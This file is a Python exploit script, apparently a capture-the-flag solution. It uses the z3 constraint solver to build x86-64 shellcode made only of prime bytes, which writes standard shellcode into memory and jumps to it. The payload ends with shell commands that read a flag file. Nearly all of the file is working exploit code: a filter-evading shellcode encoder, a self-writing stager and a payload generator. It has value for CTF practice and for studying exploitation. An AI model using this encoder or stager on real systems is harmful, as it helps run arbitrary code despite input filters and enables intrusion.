#!/usr/bin/python3

# exploit plan:
# Part 1. get standard shellcode (with non-prime bytes)
# Part 2. create shellcode (consisting only of prime bytes) that
#      a) writes shellcode 1 to a fixed memory location and
#      b) jumps there.

# Part 2 actually takes all of the work.
# I started out by gathering some useful instructions that have opcodes consisting of only prime bytes.
# I found the following instructions:

# To write data to memory:
# 89 97 FB FB FB FB : mov [rdi - 0x04040405], edx

# To control edx and thus to control the values written with the previous instructions:
# 03 97 FB FB FB FB: add edx, [rdi - 0x04040405]
# 0B 97 FB FB FB FB: or  edx, [rdi - 0x04040405]
# 2B 97 FB FB FB FB: sub edx, [rdi - 0x04040405]
# 8B 97 FB FB FB FB: mov edx, [rdi - 0x04040405]

# To control rdi and thus to control where the previous instructions write to or read from:
# 97: xchg eax, edi
# (this uses the fact that rdi was set to 0x1337000 before our shellcode is called, and thus, the top 32 bit are all clear.)

# To control eax and thus control rdi:
# 05 XX XX XX XX: add eax, 0x XX XX XX XX
# 0D XX XX XX XX: or  eax, 0x XX XX XX XX
# 25 XX XX XX XX: and eax, 0x XX XX XX XX
# 35 XX XX XX XX: xor eax, 0x XX XX XX XX
# There is also 1D XX XX XX XX: sbb eax, imm32, but I didn't use that because some processor status flags might interfere.

# With these instructions, we can write memory as follows.
# Say we want to write a 32-bit value v to an address a.
# 1. Embed v as a constant at address a2 in our program. (Assume for now that v consists only of primes.)
# 2. Set eax to (a2 + 0x04040405). (Again, assume for now that a2 consists only of primes.)
# 3. Exchange edi and eax, so edi now contains (a2 + 0x04040405).
# 4. Use the instruction mov edx, [rdi - 0x04040405] to load v into edx.
# 5. Exchange edi and eax again. (This could be skipped, probably.)
# 6. Set eax to (a + 0x04040405). (Again, assume that ... You get the point.)
# 7. Exchange edi and eax again, so edi is now (a + 0x04040405).
# 8. Use the instruction mov [rdi - 0x04040405], edx to write v to a.
# 9. Cleanup: Exchange eax and edi again. (Again, this could probably be skipped.)

# If a, a2 or v do not consist of prime bytes, try to compute them from constants that do consist of only prime bytes via the available instructions.
# We find such combinations using a simple form of program synthesis. (I.e., a constraint solver, namely, z3.)

# Thus, we have a procedure to write 4-byte values. We then divide our non-prime shellcode into blocks of four bytes and write all of these blocks individually.



################################################################################
########## IMPORTS:
################################################################################
import z3, math, struct

################################################################################
########## CONSTANTS:
################################################################################
BUF_ADDR = 0x1337000 # where the prime shellcode is loaded into
TARGET_ADDR = BUF_ADDR + 0x280 # where we write the standard shellcode
CONSTANTS_OFFSET = 0x400
CONSTANTS_ADDR = BUF_ADDR + CONSTANTS_OFFSET # where the constants used by our program will be placed
OFFSET = -0x4040405 # the offset used by the accesses to memory
PACKED_OFFSET = "\xFB" * 4 # the offset encoded as bytes (32-bit signed int)
SHELLCODE_PADDING_LENGTH = 16

################################################################################
########## UTILS:
################################################################################

def get_primes_until(upper_bound):
    "Sieve of Eratosthenes, finding all primes up to (excluding) upper_bound."
    is_prime = bytearray(b"\x01" * upper_bound)
    for i in range(2, int(math.floor(math.sqrt(upper_bound)))):
      if not is_prime[i]: continue
      for j in range(2, upper_bound//i + 1):
        if j * i < upper_bound: is_prime[j * i] = False
    return [i for i in range(2, upper_bound) if is_prime[i]]
primes = get_primes_until(256)

def new_var(name, len):
    "Returns a new symbolic bit vector for constraint solving."
    return z3.BitVec(name, len)

def add_primality_constraints_byte(solver, var):
    "Adds constaints to <solver> to make sure that <var> is a prime between 0 and 256."
    constraints = [var == p for p in primes]
    solver.add(z3.Or(*constraints))

def add_primality_constraints(solver, var):
    "Adds constaints to <solver> to make sure that each Byte in <var> is a prime between 0 and 256."
    add_primality_constraints_byte(solver, (var      ) & 0xFF)
    add_primality_constraints_byte(solver, (var >>  8) & 0xFF)
    add_primality_constraints_byte(solver, (var >> 16) & 0xFF)
    add_primality_constraints_byte(solver, (var >> 24) & 0xFF)

# Encodings for the available operations.
OP_ADD = 0x0
OP_SUB = 0x1
OP_OR  = 0x2
OP_AND = 0x3
OP_XOR = 0x4
OP_MOV = 0x5

def synthesize(value, available_ops, initial_value, max_length = 10):
    """Tries to find operations op0, op1, ... from the given set of available operations and 32-bit constants c0, c1, ... that turn the value <initial_value> to <value>, where all constants consist only of prime bytes.
    This function aborts if it did not find a sequence of up to (including) <max_length> operations leading to the desired result.
    It returns a tuple of two lists: the used operations (in the order of their usage) and the respective constants."""

    # try finding the shortest chain
    # i: length of the chain
    for i in range(0, max_length + 1):

        s = z3.Solver()

        variables = [new_var("r_"  + str(j), 32) for j in range(0, i + 1)]
        ops       = [new_var("op_" + str(j),  3) for j in range(0, i)]
        constants = [new_var("c_"  + str(j), 32) for j in range(0, i)]

        # set the zero-th variable to the initial value
        s.add(variables[0] == initial_value)

        for j in range(0, i):
            # relate the variables
            # 0 == 0 will always be true. This turns each line into an "I don't care" if another op is used.
            s.add(
                z3.If(ops[j] == OP_ADD, variables[j + 1] == variables[j] + constants[j], 0 == 0),
                z3.If(ops[j] == OP_SUB, variables[j + 1] == variables[j] - constants[j], 0 == 0),
                z3.If(ops[j] == OP_OR , variables[j + 1] == variables[j] | constants[j], 0 == 0),
                z3.If(ops[j] == OP_AND, variables[j + 1] == variables[j] & constants[j], 0 == 0),
                z3.If(ops[j] == OP_XOR, variables[j + 1] == variables[j] ^ constants[j], 0 == 0),
                z3.If(ops[j] == OP_MOV, variables[j + 1] ==                constants[j], 0 == 0)
            )

            # restrict the operations used
            op_constraints = [ops[j] == op for op in available_ops]
            s.add(z3.Or(*op_constraints))

            # make sure the constants only consist of prime bytes
            add_primality_constraints(s, constants[j])

        # require that the result of all this be the desired value
        s.add(variables[i] == value)

        # try to solve.
        if s.check() != z3.sat:
            # it's impossible to achieve the desired value with i operations. => try more operations
            continue
        else:
           # a solution was found. Return it.
           m = s.model()
           used_ops = [m[op].as_long() for op in ops]
           used_constants = [m[c].as_long() for c in constants]
           return used_ops, used_constants

    # if no solution was found, we have bad luck :(
    raise ValueError("can not synthesize value {:#08x} with up to {} operations. Maybe there is a solution with more operations.".format(value, max_length))

# Available ops for operating on eax and edx:
EAX_OPS = {OP_ADD, OP_AND, OP_OR , OP_XOR}
EDX_OPS = {OP_ADD, OP_OR , OP_SUB, OP_MOV}

################################################################################
########## SHELLCODE CREATION UTILS:
################################################################################

def and_eax(value):
    return b"\x25" + struct.pack("<I", value)

def add_eax(value):
    return b"\x05" + struct.pack("<I", value)

def or_eax(value):
    return b"\x0D" + struct.pack("<I", value)

def xor_eax(value):
    return b"\x35" + struct.pack("<I", value)

def zero_eax():
    return and_eax(0x02020202) + and_eax(0x05050505)

def cmp_eax_with(value):
    return b"\x3D" + struct.pack("<I", value)

def eax_op(op, const):
    if op == OP_ADD:
        return add_eax(const)
    elif op == OP_AND:
        return and_eax(const)
    elif op == OP_OR:
        return or_eax(const)
    elif op == OP_XOR:
        return xor_eax(const)
    else:
        raise ValueError("operation {} not supported for eax".format(op))

def xchg_eax_edi():
    return b"\x97"

def set_eax(value, prev_value):
    ops, consts = synthesize(value, EAX_OPS, prev_value)
    return b"".join(eax_op(op, const) for (op, const) in zip(ops, consts))

def edx_op(op, addr, last_eax = None):
    shellcode = b""

    if last_eax == None:
        shellcode += zero_eax()
        last_eax = 0x0

    # set eax to addr +/- OFFSET
    shellcode += set_eax(addr - OFFSET, last_eax)

    # swap eax to edi
    shellcode += xchg_eax_edi()

    # issue the instruction for edx
    if op == OP_ADD:
        shellcode += b"\x03\x97" + PACKED_OFFSET
    elif op == OP_SUB:
        shellcode += b"\x2B\x97" + PACKED_OFFSET
    elif op == OP_OR:
        shellcode += b"\x0B\x97" + PACKED_OFFSET
    elif op == OP_MOV:
        shellcode += b"\x8B\x97" + PACKED_OFFSET
    else:
        raise ValueError("operation {} not supported for edx".format(op))

    # swap edi back to eax
    shellcode += b"\x97"

    return shellcode, addr - OFFSET

def write_edx_to_mem(addr, last_eax):

    shellcode = set_eax(addr - OFFSET, last_eax)
    shellcode += xchg_eax_edi()
    shellcode += b"\x89\x97" + PACKED_OFFSET
    shellcode += xchg_eax_edi()

    return shellcode, addr - OFFSET

def jg_relative(val):
    assert(val < 128)
    assert(val >= -128)
    if val < 0:
    	val += 256
    return b"\x7f" + chr(val)


################################################################################
########## PWNING:
################################################################################

# step 1: get shellcode
with open("shellcode_x86_64.bin", "rb") as f:
    proper_shellcode = f.read()

# Also, pad the shellcode with "nop"s at the front. You'll see later why I do this.
# The "nop"s are actually "xchg eax, edi"s. But since the shellcode clears rdi and rax anyway, they don't influence the execution of the shellcode.
padded_shellcode = b"\x97" * SHELLCODE_PADDING_LENGTH + proper_shellcode
# Also, pad the shellcode to multiples of four bytes to facilitate writing in blocks of four bytes:
if (len(proper_shellcode) % 4 != 0):
    padded_shellcode += b"\x02" * (4 - (len(proper_shellcode) % 4))


def generate_payload():

    prime_shellcode = b""

    # first, synthesize the proper, padded shellcode with the operations available for edx
    ops_for_double_word = dict()
    constants_for_double_word = dict()
    for i in range(len(padded_shellcode) // 4):
        desired_result = struct.unpack("<I", padded_shellcode[i:i+4])[0]
        ops_for_double_word[i], constants_for_double_word[i] = synthesize(
            desired_result,
            EDX_OPS,
            0x02020202
        )

    # now that we know all the constants used for edx, we can try to create shellcode that
    # loads and combines them and then writes the proper shellcode to memory.
    # then, synthesize the shellcode that writes the data to memory
    # first, set edx = 0, by first "mov"ing a value into edx, then subtracting the same value.
    constants = "\x02" * 4
    new_shellcode, current_eax = edx_op(OP_MOV, CONSTANTS_ADDR)
    prime_shellcode += new_shellcode
    new_shellcode, current_eax = edx_op(OP_SUB, CONSTANTS_ADDR, current_eax)
    prime_shellcode += new_shellcode
    current_edx = 0

    # then, for each 4 byte block of the shellcode, generate code to write it to memory.
    for i in range(len(padded_shellcode) // 4):
        desired_value = struct.unpack("<I", padded_shellcode[i*4:i*4+4])[0]
        ops, consts = synthesize(desired_value, EDX_OPS, current_edx)

        for op, const in zip(ops, consts):
            new_shellcode, current_eax = edx_op(op, CONSTANTS_ADDR + len(constants), current_eax)
            prime_shellcode += new_shellcode
            constants += struct.pack("<I", const)

        current_edx = desired_value

        new_shellcode, current_eax = write_edx_to_mem(TARGET_ADDR + i * 4, current_eax)
        prime_shellcode += new_shellcode

    # Now, we have code to write the proper non-prime shellcode to memory. We "only" need to jump to it!
    # The opcode for jmp imm32 is actually a prime, but the address we want to jump to contains non-prime bytes, so we can't use that.
    # Instead, we use jg imm8. Before that, we must make sure that the jump is actually executed:
    assert(current_eax > 0x02020202)
    prime_shellcode += cmp_eax_with(0x02020202)

    # Now that jg imm8 will surely be executed, we must find a prime that we can use as an argument to jg.
    # But what if the distance between the current rip and the address of the non-prime shellcode is not a prime?
    # Luckily, I've padded the shellcode with "nop"s at the beginning, so I can jump to a slightly higher address.
    min_jmp = TARGET_ADDR - (BUF_ADDR + len(prime_shellcode) + 2)
    max_jmp = min_jmp + SHELLCODE_PADDING_LENGTH
    good_primes = filter(lambda c: min_jmp <= c and c < max_jmp and c < 128, primes)
    p = good_primes[0]

    prime_shellcode += jg_relative(p)

    exploit = prime_shellcode # the actual shellcode consisting only of primes
    exploit += b"\x02" * (CONSTANTS_OFFSET - len(prime_shellcode)) # padding
    exploit += constants # the constants used by the code
    exploit += b"\x02" * (0x1000 - len(exploit)) # padding
    exploit += b"whoami\nid\ncat flag.txt\n" # instructions to be executed by the shell.

    return exploit

################################################################################
########## MAIN:
################################################################################
if __name__ == "__main__":
    with open("exploit.bin", "wb") as f:
        f.write(generate_payload())
    print("Payload written to \"exploit.bin\".")


